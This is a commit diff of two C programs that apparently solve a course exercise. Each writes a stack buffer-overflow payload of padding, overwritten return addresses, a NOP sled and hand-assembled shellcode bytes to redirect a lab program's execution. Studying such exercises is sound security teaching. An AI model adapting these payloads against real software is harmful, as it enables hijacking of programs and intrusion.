f5a1a958ae0a79ac24ca6bab32bd175afb02bf05
Spencer <liusjtu@163.com>
2019-03-28 21:47:37 -0400

    Add files via upload

--- attack-gradeA.c
+++ attack-gradeA.c
@@ -1,10 +1,19 @@
 #include <stdio.h>
 #include <string.h>
+// name: Rongrong Liu
+// id. : rl8nh
+// description: after writing my name, insert 0 till ebp
+// then protect the ebp and change the follwoing address to somewhere behind
+// then flood that position with nop
+// then insert 3 operations.
+//// movb $0x41, 0x804a02c
+// push $0x80485dc
+// ret 0xc3
 char attackString[] = "Rongrong Liu"; //12 characters 
 int main() {
 	int i;
 	char *p = attackString;
-	for (i = 0; i < sizeof(attackString) - 1; i++) {
+	for (i = 0; i < sizeof(attackString); i++) {
 		putchar(*p);
 		p++;
 	}
@@ -12,7 +21,7 @@ int main() {
 	unsigned char zero = 0x00;
 	unsigned char nop = 0x90;
 
-	for( i = 0; i < 60; i++){
+	for( i = 0; i < 59; i++){
 			
 		putchar(zero);
 	}
@@ -27,6 +36,13 @@ int main() {
 
 	for( i = 0; i < 4; i++){
 		putchar(retbufaddr[i]);
+	}
+	
+	// push $0x80485dc
+ 	unsigned char 	addr[4] = {0x80, 0xa0, 0x04, 0x08};
+
+	for( i = 0; i < 4; i++){
+		putchar(addr[i]);
 	}
 
 	// insert nop
@@ -46,7 +62,7 @@ int main() {
  	// push $0x80485dc
  	unsigned char 	push[5] = {0x68, 0xdc, 0x85, 0x04, 0x08};
 
-	for( i = 0; i < 7; i++){
+	for( i = 0; i < 5; i++){
 		putchar(push[i]);
 	}
 
--- attack-gradeB.c
+++ attack-gradeB.c
@@ -1,24 +1,33 @@
 #include <stdio.h>
 #include <string.h>
+// Name: Rongrong Liu
+// ID:   rl8nh
+// This one is relatively easy, just redirect the program to the address of movb operation.
 char attackString[] = "Rongrong Liu"; //12 characters 
 int main() {
 	int i;
 	char *p = attackString;
-	for (i = 0; i < sizeof(attackString) - 1; i++) {
+	for (i = 0; i < sizeof(attackString); i++) {
 		putchar(*p);
 		p++;
 	}
 
 	unsigned char zero = 0x00;
 	unsigned char nop = 0x90;
+	unsigned char var = 0x66;
 
-	for( i = 0; i < 64; i++){
+	for( i = 0; i < 51; i++){
+			
+		putchar(var);
+	}
+	
+	for( i = 0; i < 12; i++){
 			
 		putchar(zero);
 	}
 
  	
- 	unsigned char 	retaddr[9] = {0xd5, 0x85, 0x04, 0x08, 0x18, 0xa0, 0x04, 0x08, 0x01};
+ 	unsigned char 	retaddr[9] = {0xd5, 0x85, 0x04, 0x08, 0x80, 0xa0, 0x04, 0x08, 0x01};
 
 	for( i = 0; i < 9; i++){
 		putchar(retaddr[i]);
